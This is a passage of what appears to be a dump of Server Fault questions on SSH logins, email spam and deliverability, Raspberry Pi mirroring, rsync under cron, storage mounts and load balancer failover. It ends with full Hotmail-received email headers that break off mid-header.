debug3: no such identity: /Users/XXX/.ssh/id_ecdsa: No such file or directory
debug1: Trying private key: /Users/XXX/.ssh/id_ed25519
debug3: no such identity: /Users/XXX/.ssh/id_ed25519: No such file or directory
debug2: we did not send a packet, disable method
debug3: authmethod_lookup password
debug3: remaining preferred: ,password
debug3: authmethod_is_enabled password
debug1: Next authentication method: password
root@XXXX's password: 
</code></pre>
","<ssh><login><root>","2016-07-09 09:06:21"
"998854","Email with different domain name are being sent from inside the organization to outside mail","<p>Recently our domain was flagged as spam, and we found out that emails with spam are being sent from inside our organization but with domain different than our Domain.</p>

<p>Example:
our domain : email@example.com
the spam email sender: spamer@imf.com</p>

<p>so am not sure how this happened</p>

<p>any help would be appreciated, thank you</p>
","<email><exchange>","2020-01-14 09:15:50"
"878145","Raspberry Wi-Fi Access Point doesn't transmit traffic from mirror port","<p>I'm setting up a Raspberry Pi as an Access Point (Wi-Fi) and I'd like to use it to monitor a switch traffic.</p>

<p>I setted up a mirror port on a Cisco Catalyst switch and configured my Raspberry Pi to work as an Access Point (with hostapd).</p>

<p>I configured a bridge between my eth0 and my wlan0 interfaces with brctl.</p>

<p>My problem is that <strong>the mirrored traffic isn't transmitted through Wi-Fi</strong>.</p>

<p>What I've already verified :</p>

<ul>
<li>Directely connected on switch (via Ethernet cable) I see all the mirrored traffic</li>
<li>The Access Point works well (I can communicate with all clients connected to the switch)</li>
<li>The IP forwarding is enabled on the Raspi (I've verified it via sysctl)</li>
<li>I tried modifying the aging time on my bridge to 0 (brctl setageing) but it doesn't change anything.</li>
</ul>

<p>For information, I've a 3Model B Rapsberry Pi and have installed raspbian with Kernel version 4.9.54-v7+.</p>

<p><strong>To sum up, my purpose is to use a laptop connected via Wi-Fi to analyze packets going on a specified switch (and if possible to have multiple clients connected through Wi-Fi).</strong></p>

<p>I may think that it could also be a limitation of the Wi-Fi</p>

<p>Thanks in advance.</p>
","<wifi><raspbian><port-mirroring>","2017-10-12 14:13:40"
"998880","What is in the temp file in the root directory in CentOS?","<p>What is in the temp file in the root directory in CentOS? I want to know what content is in the temp file.</p>
","<centos>","2020-01-14 11:55:22"
"788892","Getting a safe access to a computational server","<p><em>Disclaimer: I'm not a sysadmin, so I might say stupid things / rely on incorrect assumptions. Feel free to correct me.</em></p>

<p>I work in a startup and some time ago we bought a server for internal use for a job. Now the job's over and we'd like to use it as 'computational workhorse'. The server can run virtual machines and we can control them via VMWare vSphere. I'd like to get a safe access to an instance of a linux vm (a debian one) via ssh.</p>

<p>My first approach would be to just keep the debian VM instance up and running, set up ssh and authentication with my RSA keys and port-forward 22 to any external IP on the internet (through the corporate router with firewall).</p>

<p>Is this unsafe? </p>

<p>Notice that there are no VPNs involved in the scenario described above.</p>
","<linux><ssh><security><vmware-vsphere><port-forwarding>","2016-07-09 15:38:54"
"788918","IP Configure headache","<p>My IP adress gone after sometime of getting internet connection...My IPadress is 172.16.91.79 and subnet mask is 255.255.255.128 and default gateway is 172.16.91.129 told by the operator...
But evrytime i try to set this, a warning sign come on screen saying ""the default gateway is not on the same network segment (subnet) that is defined by the IP adress and subnet mask. Do you want to save this configuration ? "" </p>

<p>And with this the internet connection is still off.  I really want a solution what should i do?? </p>
","<windows-7>","2016-07-09 17:39:06"
"998925","How can I offer a dedicated IP service to customers?","<p>I am working on an email project that could benefit from dedicated IPs in regards to sender reputation. A lot of email services like Mailchimp offer this feature. I am curious how to go about setting something like this up. Here are my ideas so far:</p>

<ol>
<li>Setup a dedicated box with it's own IP to act only as a proxy and funnel requests through. I will somehow need to be able to route mail through this proxy in my socket code which could be tricky when dealing with SMTP. NGINX would probably be up for this job.</li>
<li>Use some sort of floating IP system with my code monitoring network interfaces and dynamically binding to a certain interface on a request by request basis. This is probably a non-starter since I can't just have hundreds of floating IPs hooked up to a box.</li>
</ol>

<p>Perhaps there is another much easier way to do this that I haven't found yet? If I'm already on the right track could you offer advice and tools to achieve this goal?</p>
","<nginx><email><proxy><ip><reverse-proxy>","2020-01-14 15:40:05"
"998984","Server 2008 32-bit on Azure","<p>I'm trying to setup a VM on Azure. The VM is windows server 2008 32-bit. I cant seem to find the image for it. any help is appreciated. I've tried to look for the correct image in the market place and I have only x64 options for which don't work in my case. Do you know of a work-around? </p>
","<windows><32-bit>","2020-01-14 23:28:40"
"999071","Approach for IT Support assistance","<p>Let's say that you are a company that gives IT Support. Your client contact you to have a price quotation to give IT Support for the following areas: Network (Wifi included) Servers Storage Cloud services</p>

<p>In order to have an idea, which steps would you follow to understand what's the impact of the work?</p>

<p>As first, I believe you need to know what's the number and the status of the assets you need to give assistance to. This implies an inventory of the hardware, software, license and warranty status, from 10000ft view.</p>

<p>Do you have any experience on how to conduct this analysis? Thanks.</p>

<p>.: Francesco</p>
","<hardware><asset-management><manage>","2020-01-15 14:48:04"
"878409","rsync fails in crontab","<p>So I have a very simple rsync command that is set within a script. </p>

<pre><code>rsync -avzh /mnt/data/i user@server:/mnt/data/
</code></pre>

<p>When I run the script manually there are no issues. When I run the script from crontab I get the following in my output:</p>

<pre><code>WARNING: ECDSA key found for host server
in /home/user/.ssh/known_hosts:9
ECDSA key fingerprint 

Host key verification failed.
rsync: connection unexpectedly closed (0 bytes received so far) [sender]
rsync error: unexplained error (code 255) at io.c(600) [sender=3.0.6]
</code></pre>

<p>So rsync finds the ssh key but for some reason cannot use it.
Now I found some questions that were for the same error and were solved. One involved running the script in cron and manually as different users. I have verified via a whoami within the script that the cron job runs as the same user that I am using to manually run the script. Another question is solved by defining where the rsync command is in the file system. This one also has been checked by running a which within the script.</p>

<p>Now through all of this I have noticed that rsync is using ssh to do its job. So I checked the locations of ssh within the script. Two separate locations, one in /usr/share/centrifydc/bin, when run manually, and the other in /usr/bin, when run by cron.</p>

<p>So this led me to checking out the .bashrc and .bash_profile to find out if that path or possibly alias is set there. It is not.</p>

<p>This leads me to the actual question, how can I set the /usr/share/centrifydc/bin/ssh binary as the default for the cron jobs? And if I do will it fix the issue?</p>
","<ssh><cron><rsync>","2017-10-13 21:30:11"
"789108","What is better: iSCSI or NFS for mysql datadir mount?","<p>There is database server with ip-address in external zone with mysql instances and nas-storage existing in internal zone. I need that database file is located in storage. I want write in my.cnf for example:</p>

<pre><code>[mysqld1]
port       = 3306
datadir    = /data/sql/mysqld1

[mysqld2]
port       = 3307
datadir    = /nasstorage/sql_on_storage/mysqld2
bind-address = 0.0.0.0
</code></pre>

<p>I am planning to mount directory from storage to database server. Which is technology is better for this puspose: iSCSI or NFS?</p>
","<mysql><nfs><iscsi><synology>","2016-07-11 10:31:13"
"878413","Testing Hard Drives","<p>First off, I hope this is the right location for this question, if not, any guidance on where to go would be greatly appreciated. </p>

<p>I am looking for some equipment to test multiple hard drives. In the past, we used a simple Drive Duplicator and just ran a DOD wipe on it, but that method is horrible on the poor drives.
I have googled my heart out to find some kinda device meant for this, and I know they exist, but I cannot find one.</p>

<p><strong>What I am looking for:</strong></p>

<ul>
<li>Multiple drive capability (would want to shoot for 5-6+ to be tested simultaneously)</li>
<li>SATA Drive Type (having the ability to also so SAS with an adapter would be a plus</li>
</ul>

<p>Let me know if any other information is required.</p>
","<hard-drive><hardware><sata>","2017-10-13 21:59:29"
"878461","How does loadbalancers like haproxy and keepalived implement failover/high-availability for themselves, in case the machine they are running dies?","<p>I'm trying to understand how my load balance software does not become a single-point-of-failure. Do load-balancing software usually support failover/ha for themselves?</p>
","<load-balancing><haproxy><failover><failovercluster><keepalived>","2017-10-14 14:23:09"
"999172","Maria Performance Tuning: HyperThreading is great for marketing, lousy for performance","<p>I'm looking into optimizing my database server and this is what I read in Maria's official documentation <a href=""https://mariadb.com/kb/en/mariadb-memory-allocation/"" rel=""nofollow noreferrer"">here</a>. </p>

<p>How true is this? More so, how is this true? </p>

<p>Apologies if this is not the best place to ask this question. Please redirect me.</p>
","<mariadb><performance-tuning><hyperthreading>","2020-01-16 06:54:10"
"789178","Hotmail blocks my SMTP server","<p>Recently i discovered that hotmail has blocked my SMTP once again.</p>

<p>The error code is <code>Diagnostic-Code: smtp;550 SC-001 (COL004-MC5F28)</code> </p>

<p>I only send for my web based online 2d text game : <a href=""http://www.monstermmorpg.com"" rel=""nofollow noreferrer"">http://www.monstermmorpg.com</a></p>

<ul>
<li>Activation emails</li>
<li>Password recovery emails</li>
</ul>

<p>It is free to play so you can register to test email attributes. Once you register it will send you verification email</p>

<p>I have contacted Microsoft team and they have swiftly removed the block thankfully. But i want to prevent further blockages</p>

<p>Here an email source code send from my SMTP server to my own hotmail account</p>

<p>So are there anything wrong with my server configuration? anything missing? what do you suggest? thank you</p>

<pre><code>Received: from DB4PR08MB0208.eurprd08.prod.outlook.com (10.161.250.26) by
 AM3PR08MB0200.eurprd08.prod.outlook.com (10.161.35.151) with Microsoft SMTP
 Server (TLS) id 15.1.539.14 via Mailbox Transport; Mon, 11 Jul 2016 17:00:33
 +0000
Received: from AM3PR08CA0042.eurprd08.prod.outlook.com (10.160.207.180) by
 DB4PR08MB0208.eurprd08.prod.outlook.com (10.161.250.26) with Microsoft SMTP
 Server (TLS) id 15.1.528.16; Mon, 11 Jul 2016 17:00:32 +0000
Received: from HE1EUR01FT049.eop-EUR01.prod.protection.outlook.com
 (2a01:111:f400:7e1f::209) by AM3PR08CA0042.outlook.office365.com
 (2a01:111:e400:8840::52) with Microsoft SMTP Server (TLS) id 15.1.539.14 via
 Frontend Transport; Mon, 11 Jul 2016 17:00:32 +0000
Received: from BAY004-MC5F20.hotmail.com (10.152.0.56) by
 HE1EUR01FT049.mail.protection.outlook.com (10.152.0.221) with Microsoft SMTP
 Server (TLS) id 15.1.534.7 via Frontend Transport; Mon, 11 Jul 2016 17:00:31
 +0000
Received: from MonsterMMORPG.com ([138.128.2.226]) by BAY004-MC5F20.hotmail.com with Microsoft SMTPSVC(7.5.7601.23143);
     Mon, 11 Jul 2016 10:00:27 -0700
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
  s=s1024; d=monstermmorpg.com;
  h=mime-version:from:to:date:subject:content-type:message-id;
  bh=VWCrPK7DB0WuVjry+X0TdhElRdFfzJr4P6679X2gvN4=;
  b=dcE1DN+cs4hebPthdZoijyVCLJmVTMyk4Un9nUIrkbOGnMq0vaSAntC4IduutGz/uPfpDx5B
    HwJubavlEkflzW/94ft0js3ipotBWuVilnbePNYl8giWv4sqYzW2mb6Q8pepXTgQAS9jtvcq
    OMK+bpFTecF592bI9ggFVcKhUCE=
DomainKey-Signature: a=rsa-sha1; q=dns; c=nofws;
  s=s1024; d=monstermmorpg.com;
  h=mime-version:from:to:date:subject:content-type:message-id;
  b=Wv5UTcZ+UGA+3lQFrmkQC+9MEZHmzCXde/LwoTgy6TOa7MUf5RnCw1k/5EchsvyF+tT+f5VG
    /cydaefWLntZ58ek1VeSRgQkXO/UYIvqYq6jfG32ag9MOz7SnoMvw7msP/irp42nYWoC+MI3
    vuc0TxMULetZQBOFIA77O0IN+MU=
Received: from MonsterMMORPGServer ([127.0.0.1]) by MonsterMMORPG.com with Microsoft SMTPSVC(8.5.9600.16384);
     Mon, 11 Jul 2016 17:00:12 +0000
From: ""MonsterMMORPG Password Recovery"" &lt;noreply@monstermmorpg.com&gt;
To: cefurkan@hotmail.com
Reply-To: MonsterMMORPG Administrator &lt;admin@monstermmorpg.com&gt;
Date: 11 Jul 2016 17:00:12 +0000
Subject: MonsterMMORPG Your Game Info
Content-Type: multipart/alternative;
 boundary=--boundary_182_adaceebe-2ea9-4d4f-a2be-6f04682429c5
Return-Path: noreply@monstermmorpg.com
Message-ID: &lt;MONSTERMMORPGSEHZlJ0005996f@MonsterMMORPG.com&gt;
X-OriginalArrivalTime: 11 Jul 2016 17:00:12.0002 (UTC) FILETIME=[B0028420:01D1DB95]
X-MS-Exchange-Organization-Network-Message-Id: 5a927975-867d-4a4f-b0e1-08d3a9acdec2
X-EOPAttributedMessage: 0
X-EOPTenantAttributedMessage: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa:0
X-MS-Exchange-Organization-MessageDirectionality: Incoming
CMM-sender-ip: 138.128.2.226
CMM-sending-ip: 138.128.2.226
CMM-Authentication-Results: hotmail.com; spf=pass (sender IP is
 138.128.2.226) smtp.mailfrom=noreply@monstermmorpg.com; dkim=pass
 header.d=monstermmorpg.com; x-hmca=pass header.id=noreply@monstermmorpg.com
CMM-X-SID-PRA: noreply@monstermmorpg.com
CMM-X-AUTH-Result: PASS
CMM-X-SID-Result: PASS
CMM-X-Message-Status: n:n
CMM-X-Message-Delivery: Vj0xLjE7dXM9MDtsPTA7YT0wO0Q9MTtHRD0yO1NDTD0w
CMM-X-Message-Info: NhFq/7gR1vQEIc6doRqVYph35rmfBJ4+FB9UePjIVouKKgXAShz+GyxZgf8BFhaKj8+BRm+xXCG3TJ9aBu/Z2GgiRdHFjhJWx9Juz9aWGGd155TSj0gHJe7FiMsXbTSB7FzKyIuk77D+wmCu0KxL95u3rGUynjt7/r/S+/OY21PEOokuREy/vL/Py0eSMPRAnAvjDB9eEsKaV8bllF+0bISEQjAd54zRnMRpc6DJI54=
X-MS-Exchange-Organization-PCL: 2
X-Forefront-Antispam-Report: EFV:NLI;SFV:SPM;SFS:(68900001);DIR:INB;SFP:;SCL:5;SRVR:DB4PR08MB0208;H:BAY004-MC5F20.hotmail.com;FPR:;SPF:None;LANG:en;
X-MS-Office365-Filtering-Correlation-Id: 5a927975-867d-4a4f-b0e1-08d3a9acdec2
X-Microsoft-Exchange-Diagnostics: 1;DB4PR08MB0208;2:l32wZKZDkeUFc4NqZsLGswRaiawDgPGUfCOWb9izVxm5VXXQNb3mQDsYBAs/XFhdpbeYAVQ+wYb5s+5Qvc8xehVOm9GBR4WQy9QOrmXwR+vEkWiPHa1Whf2m7OXzNmb/H6Uj/mnnbB7J27IJCG5qZ07+7D5GQmZ/FXie0vRBoZRSVJXULoNfkedZ0KRz1iCsTNoXh5Y0D53b0nZxzKBd/Q==;3:sSgnjqV1eIsWvZVZK+xAUjENJMrTi18JOBKQLf1+l15Htv0cbtw+z0bvbETcMRWNVArkViioCD1fSDBLKlMJIzw/c9QV6OWcNaE80mmnnpzv+V8LBo8Xr5i5t1uJmTFFw3oRcGyqCBSpOaxv99EhRGIEkH6+ukqXPZ7ELbT+mPM=;25:HrjqSitI1Nn1FR9CciNAhk42ZIYb9cl5UCS4eSVwOWnud6FHU8VAb+PxJwc4dLUxLmsa/YxF2cGEgIsKu/18f5tLef4M1FhoA9tKkga0ejaxhtn2M8gKOoBij2yz09F3qDfBATcStRL7GdUdvunx9yfsvrrPurSrhZTkfqrl3i9yrR24iwFLdx1WJuslpdh7wnLp6KBYYbF41Vys1NJ0PcyGxqWk/zr9ayzc+vlbjkx8Rcj267aj1DndUs3HZFEO4Nz7AlK8JETCQJx7WUHsl9+cMoyqjWLld8g4sfy6TAShIInlgPF2JvVsOkIPfuYWBGOTXufaNCiS2hrtRndMb2obzCmXz5XSKOhxZUkNwOeHp3FT6UK26y9OYVGUXV/RmU3aRhDA+0GIYbWTyqV7z9bvqTEmz2tD+jSwr6DJAlL/nn0fBmLeXHnxXX5Ui2LT
X-Microsoft-Antispam: BCL:0;PCL:0;RULEID:(8291501002);SRVR:DB4PR08MB0208;
X-Microsoft-Exchange-Diagnostics: 1;DB4PR08MB0208;31:rMz4+9ax9/QibLmSYElXNTXZn1E/MQEdgzlG7WtE3yffz17fqRSm4rXB2uQmU1yo8KoyznVLxmTw7Iki+5yEPqgvQeNvobcKH+hfyLZBROI8F2RVt4AiZHLyg1cC2Nt2JDmpYTLsVTRXo3DpFiHOo7u4wS+ZEeZsrwbLmJ9RtJwW75cZTBrHPZyEr2E1hIhmsAwN9rjNZrKqL++7ej1uBQ==;4:X9NQhWiUIOLs8WIy/Qo6lWqsRAIFyz1A3lTtpi3ygwSitp8v7oigEglZf3UCS9OFEivYutE7PhG+gOP23G7wLwrmzB0AD0qNB6K2AGsHc8Z7GbFDMRUdWbnPGllJINzoF1VGVuuL3s+/GiEjCaPOQcKgUEZUaLUyn9dpbnDzgo0rh6E8zG8TowecitW4uYqsAaXrb+Siajm9G1zHdPX89Iavxf8wgqteizJQiewTK6NZoRMzCjk1KmNSkeTkkvskbl8yWfRyiAlmjVgtog7FpA==;23:LZMBDr9dU0JvT5tmFhtcnIwVqlqzD9DcitaYRytxm3EwChXHByAhuRPOY8M/udlr5Pv2ULHgkoDK73kzPXaV49e+HMHWLDTYCh1yLL7xFcCfTw2lgffK6fVgzcYMt9GKwjAz+iYBJ9XY9FXO8llYjk/fT7KhrJND1UI0Kds790cPNW2x4f8CyFbhp1Ojv5qexRlFScjeZhjyJ5rP2QYuK6eZTOlvEY8VRnTkHgAgG40=
X-Exchange-Antispam-Report-CFA-Test: BCL:0;PCL:0;RULEID:(82015046);SRVR:DB4PR08MB0208;BCL:0;PCL:0;RULEID:;SRVR:DB4PR08MB0208;
X-MS-Exchange-Organization-SCL: 5
X-Microsoft-Exchange-Diagnostics: 1;DB4PR08MB0208;6:s3jlsUg95+m7Eji6tf7Qq/teHyWPYrJDP7Kcw3PH9ZbvCnLnn5hpOuS75CWhFSJYCRjK4TRegjvqKs4wlsuAacpqDAP0ABa6oeeyzktiOqHT1NgNENVwoH/XW0Ug4dgg28atHFIbtjWVnJE5sYOAUYfdm7QlZadHaGNXA9GERkI+1u15k/m8glHtCWd6yKNEQidb25BbwjYytYZgf3Q0pVFIf8rdtvD+ycG1VkFUdvAgUH3hnWfCuSXUNJ6lkyVu9a7Y1C+LIC7Ktgly1u3FC4cf85BLke86vkdAuqkHXoqaAbE44LCpxneqnoDDrF0H;5:LMpdBxsGfmL5kyGUEFW+410tOd0DaNLLucvTpdJf/5qs+cnZ+iHWY8ERN2eCqPIRX6y4olKPsfDkiWxagyhHViVGwPJ88MwVayCQ69RHULIwEQ/+axhdP5XqGC0oNwe3v/UYeYEx7mLrKhB67Z7+4g==;24:At5AkoCbGkKLyAdrVftAcaGjPQ5h48H/FrRT5m7Temaicfv5Q4wwtmJkxxYvNjr4Ik99P4pj5t3gLN0sRN3rlA==;7:bf1mTXCS7HoBWRAG15xts7mDuirEMPJFIiIZxk8zkHfWG9osIAh6LxOSuE4GbC4vcH7xo7jaiVKIJV1h7XDpAt6HOH0y/yX2FBp1r0vcasaUHaUezcPjQP7K0Nf4VjrTLne4BxcHCPrqLVhWJpQtokv0ov4uxVSLtVHdNBHeMeiigV/NCp7+LBpIfeC7atXdipyvIEwrJAliYoyXGh4lPiq1zM5MTSp4U9mHgfR/iF9g9wRQR9Bn1vzcpCVDgG1/BjyWoP78id2jppNFeX43og==
SpamDiagnosticOutput: 1:22
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 11 Jul 2016 17:00:31.3173
 (UTC)
X-MS-Exchange-CrossTenant-Id: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa
X-MS-Exchange-CrossTenant-FromEntityHeader: Internet
X-MS-Exchange-Transport-CrossTenantHeadersStamped: DB4PR08MB0208
X-MS-Exchange-Organization-AuthSource: HE1EUR01FT049.eop-EUR01.prod.protection.outlook.com
X-MS-Exchange-Organization-AuthAs: Anonymous
X-MS-Exchange-Transport-EndToEndLatency: 00:00:02.0914094
X-Microsoft-Exchange-Diagnostics:
    =?utf-8?B?MTtBTTNQUjA4TUIwMjAwOzk6a3c2S0d1SVJpN2hKMjVuY2UzV3JWdVNBUkNH?=
 =?utf-8?B?K3RKOUNBbmEvUjBXREx3WE1jVlV0WFhjTklSWXE3dlJWQkZNY1VmbDdmTXZY?=
 =?utf-8?B?UktBM21ma1MzM1JESXVRMWdqLzBiOHZ0NU94bVNqendzbVN4QTRUT2FLWTEw?=
 =?utf-8?B?VXQ3N3o4b094R1JxNG42QTFlcjQ1d0M4cWpzaE5WVVE4VHFJU1NXZVRXZ1Fz?=
 =?utf-8?B?dU1MaFpJT3JTQVoxT1pPZ3pTL28rdnE3dnVRWlJxT3lsREN3c0ZYb1VnSkpt?=
 =?utf-8?B?ZmltcGRCTjhCR1dNMzNTUWlhSGZqN0wrWFBmeGMyWlZtZnBXNDJZL2VwdHp5?=
 =?utf-8?B?R2Jwb05aMUdOWWdVOEZzcU9pemlmb29hWGJVN3RORU1PRTYwU2xJWUZIV1Ni?=
 =?utf-8?B?OFp2WnNYN2ZYUVVnMEdzeHFrWlJtODJtYWJUenQ4a1ZhMkZvMFZaakg1Mkgx?=
 =?utf-8?B?ZUt1M0RyUGNmaTdlUHFOam1Vc2pqVkxySldLd0ZZalZtQ1F1OGt2NUVEM01U?=
 =?utf-8?B?dnJoWE1jVXVvQjlCRXhSZ2JwMGF2Ry81N0p3eFpXaS9QYnQ2NjdFYWhlNUl3?=
 =?utf-8?B?dkpkbW9LVGNIeXpQVGVlOS9TYlVuVTlrUy9yQkR2REJOU1oxWFd3RS9qcGZy?=
 =?utf-8?B?MFJxYnJXVnlHbWt5eDZ3SCtza1BqRUsrOTRRbmorWC9XRDZUam1FTm50VWpE?=
 =?utf-8?B?dHc2bjhTSEd6NTBzLzJBUEl0a1AzcVZ1ZGV4dWtmeGc1TS9QOW5yYm4vRlZF?=
 =?utf-8?B?NkhlLys5REZZaVVURnF0Mjdzb3llelI3WEw5bE1jSmlOenZaRzAwU1lObHB0?=
 =?utf-8?B?RVRiRVNFUjhnNDl5VlRITGZwbFpPTWZhKzdidUdxeFpRODJkSEtIVmhwWENG?=
 =?utf-8?B?ZlFVa280c3VYdis0VndWeXQ5SklicFV5eTVNMlJHWExVNEF5QjllWXlEV0RH?=
 =?utf-8?B?d3VtVFJnSHJpNjZqRnRWVTk2M3hVVGpOWTVBc3pOSkNyUTd6RGMrTVlBOGZl?=
 =?utf-8?B?SXQ5NW1oNFRQN3NIL0t1VUhHcnFpdldxcmxiMzk4KzJKY0w1VS9zNnEwTUZy?=
 =?utf-8?B?dDBMRHllUGVmQ0c5cXFQZy9UOStnWXl4Y2dCdGxCMVMvbmUrWjZKUkVzemo0?=
 =?utf-8?B?K1dyemcvdVJCQ293anBCNm43THNZajJWUnJlcGgrU3l0L3hxQWNvOXhZd3o4?=
 =?utf-8?B?cXU4anRzZjZXYklZZ3h2bExTcGRMeGVWSXpGNGxsczZCZlRzT2hDYWE4T1Bq?=
 =?utf-8?B?S1RUOXdRMU45aFhQWUhoTG9UaEUyY0FxRHA2Q2xPUFJNb2tWV2d1V2tWVnA2?=
 =?utf-8?B?d3ZvQWxzRnN0dz09?=
X-Microsoft-Antispam-Mailbox-Delivery:
    abwl:0;wl:1;pcwl:1;rwl:0;ex:0;auth:1;dest:I;WIMS-SenderIP:138.128.2.226;WIMS-SPF:monstermmorpg%2ec;WIMS-DKIM:monstermmorpg%2ec;WIMS-822:noreply%40monstermmorpg%2ecom;WIMS-PRA:noreply%40monstermmorpg%2ecom;WIMS-AUTH:PASS;ENG:(102400050)(102409045);OFR:TrustedSenderList;
MIME-Version: 1.0

----boundary_182_adaceebe-2ea9-4d4f-a2be-6f04682429c5
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable
X-Microsoft-Exchange-Diagnostics:
    =?utf-8?B?MTtBTTNQUjA4TUIwMjAwOzk6a3c2S0d1SVJpN2hKMjVuY2UzV3JWdVNBUkNH?=
 =?utf-8?B?K3RKOUNBbmEvUjBXREx3WE1jVlV0WFhjTklSWXE3dlJWQkZNY1VmbDdmTXZY?=
 =?utf-8?B?UktBM21ma1MzM1JESXVRMWdqLzBiOHZ0NU94bVNqendzbVN4QTRUT2FLWTEw?=
 =?utf-8?B?VXQ3N3o4b094R1JxNG42QTFlcjQ1d0M4cWpzaE5WVVE4VHFJU1NXZVRXZ1Fz?=
 =?utf-8?B?dU1MaFpJT3JTQVoxT1pPZ3pTL28rdnE3dnVRWlJxT3lsREN3c0ZYb1VnSkpt?=
 =?utf-8?B?ZmltcGRCTjhCR1dNMzNTUWlhSGZqN0wrWFBmeGMyWlZtZnBXNDJZL2VwdHp5?=
 =?utf-8?B?R2Jwb05aMUdOWWdVOEZzcU9pemlmb29hWGJVN3RORU1PRTYwU2xJWUZIV1Ni?=
 =?utf-8?B?OFp2WnNYN2ZYUVVnMEdzeHFrWlJtODJtYWJUenQ4a1ZhMkZvMFZaakg1Mkgx?=
 =?utf-8?B?ZUt1M0RyUGNmaTdlUHFOam1Vc2pqVkxySldLd0ZZalZtQ1F1OGt2NUVEM01U?=
 =?utf-8?B?dnJoWE1jVXVvQjlCRXhSZ2JwMGF2Ry81N0p3eFpXaS9QYnQ2NjdFYWhlNUl3?=
 =?utf-8?B?dkpkbW9LVGNIeXpQVGVlOS9TYlVuVTlrUy9yQkR2REJOU1oxWFd3RS9qcGZy?=
 =?utf-8?B?MFJxYnJXVnlHbWt5eDZ3SCtza1BqRUsrOTRRbmorWC9XRDZUam1FTm50VWpE?=
 =?utf-8?B?dHc2bjhTSEd6NTBzLzJBUEl0a1AzcVZ1ZGV4dWtmeGc1TS9QOW5yYm4vRlZF?=
 =?utf-8?B?NkhlLys5REZZaVVURnF0Mjdzb3llelI3WEw5bE1jSmlOenZaRzAwU1lObHB0?=
 =?utf-8?B?RVRiRVNFUjhnNDl5VlRITGZwbFpPTWZhKzdidUdxeFpRODJkSEtIVmhwWENG?=
 =?utf-8?B?ZlFVa280c3VYdis0VndWeXQ5SklicFV5eTVNMlJHWExVNEF5QjllWXlEV0RH?=
 =?utf-8?B?d3VtVFJnSHJpNjZqRnRWVTk2M3hVVGpOWTVBc3pOSkNyUTd6RGMrTVlBOGZl?=
 =?utf-8?B?SXQ5NW1oNFRQN3NIL0t1VUhHcnFpdldxcmxiMzk4KzJKY0w1VS9zNnEwTUZy?=
 =?utf-8?B?dDBMRHllUGVmQ0c5cXFQZy9UOStnWXl4Y2dCdGxCMVMvbmUrWjZKUkVzemo0?=
 =?utf-8?B?K1dyemcvdVJCQ293anBCNm43THNZajJWUnJlcGgrU3l0L3hxQWNvOXhZd3o4?=
 =?utf-8?B?cXU4anRzZjZXYklZZ3h2bExTcGRMeGVWSXpGNGxsczZCZlRzT2hDYWE4T1Bq?=
 =?utf-8?B?S1RUOXdRMU45aFhQWUhoTG9UaEUyY0FxRHA2Q2xPUFJNb2tWV2d1V2tWVnA2?=
 =?utf-8?B?d3ZvQWxzRnN0dz09?=
X-Microsoft-Antispam-Mailbox-Delivery:
    abwl:0;wl:1;pcwl:1;rwl:0;ex:0;auth:1;dest:I;WIMS-SenderIP:138.128.2.226;WIMS-SPF:monstermmorpg%2ec;WIMS-DKIM:monstermmorpg%2ec;WIMS-822:noreply%40monstermmorpg%2ecom;WIMS-PRA:noreply%40monstermmorpg%2ecom;WIMS-AUTH:PASS;ENG:(102400050)(102409045);OFR:TrustedSenderList;

Username : denemeemail=0D=0APassword : linkedin.com=0D=0A=0D=0APl=
ease mark this message as not junk/spam
----boundary_182_adaceebe-2ea9-4d4f-a2be-6f04682429c5
Content-Type: text/html; charset=utf-8
Content-Transfer-Encoding: quoted-printable
X-Microsoft-Exchange-Diagnostics:
    =?utf-8?B?MTtBTTNQUjA4TUIwMjAwOzk6a3c2S0d1SVJpN2hKMjVuY2UzV3JWdVNBUkNH?=
 =?utf-8?B?K3RKOUNBbmEvUjBXREx3WE1jVlV0WFhjTklSWXE3dlJWQkZNY1VmbDdmTXZY?=
 =?utf-8?B?UktBM21ma1MzM1JESXVRMWdqLzBiOHZ0NU94bVNqendzbVN4QTRUT2FLWTEw?=
 =?utf-8?B?VXQ3N3o4b094R1JxNG42QTFlcjQ1d0M4cWpzaE5WVVE4VHFJU1NXZVRXZ1Fz?=
 =?utf-8?B?dU1MaFpJT3JTQVoxT1pPZ3pTL28rdnE3dnVRWlJxT3lsREN3c0ZYb1VnSkpt?=
 =?utf-8?B?ZmltcGRCTjhCR1dNMzNTUWlhSGZqN0wrWFBmeGMyWlZtZnBXNDJZL2VwdHp5?=
 =?utf-8?B?R2Jwb05aMUdOWWdVOEZzcU9pemlmb29hWGJVN3RORU1PRTYwU2xJWUZIV1Ni?=
 =?utf-8?B?OFp2WnNYN2ZYUVVnMEdzeHFrWlJtODJtYWJUenQ4a1ZhMkZvMFZaakg1Mkgx?=
 =?utf-8?B?ZUt1M0RyUGNmaTdlUHFOam1Vc2pqVkxySldLd0ZZalZtQ1F1OGt2NUVEM01U?=
 =?utf-8?B?dnJoWE1jVXVvQjlCRXhSZ2JwMGF2Ry81N0p3eFpXaS9QYnQ2NjdFYWhlNUl3?=
 =?utf-8?B?dkpkbW9LVGNIeXpQVGVlOS9TYlVuVTlrUy9yQkR2REJOU1oxWFd3RS9qcGZy?=
 =?utf-8?B?MFJxYnJXVnlHbWt5eDZ3SCtza1BqRUsrOTRRbmorWC9XRDZUam1FTm50VWpE?=
 =?utf-8?B?dHc2bjhTSEd6NTBzLzJBUEl0a1AzcVZ1ZGV4dWtmeGc1TS9QOW5yYm4vRlZF?=
 =?utf-8?B?NkhlLys5REZZaVVURnF0Mjdzb3llelI3WEw5bE1jSmlOenZaRzAwU1lObHB0?=
 =?utf-8?B?RVRiRVNFUjhnNDl5VlRITGZwbFpPTWZhKzdidUdxeFpRODJkSEtIVmhwWENG?=
 =?utf-8?B?ZlFVa280c3VYdis0VndWeXQ5SklicFV5eTVNMlJHWExVNEF5QjllWXlEV0RH?=
 =?utf-8?B?d3VtVFJnSHJpNjZqRnRWVTk2M3hVVGpOWTVBc3pOSkNyUTd6RGMrTVlBOGZl?=
 =?utf-8?B?SXQ5NW1oNFRQN3NIL0t1VUhHcnFpdldxcmxiMzk4KzJKY0w1VS9zNnEwTUZy?=
 =?utf-8?B?dDBMRHllUGVmQ0c5cXFQZy9UOStnWXl4Y2dCdGxCMVMvbmUrWjZKUkVzemo0?=
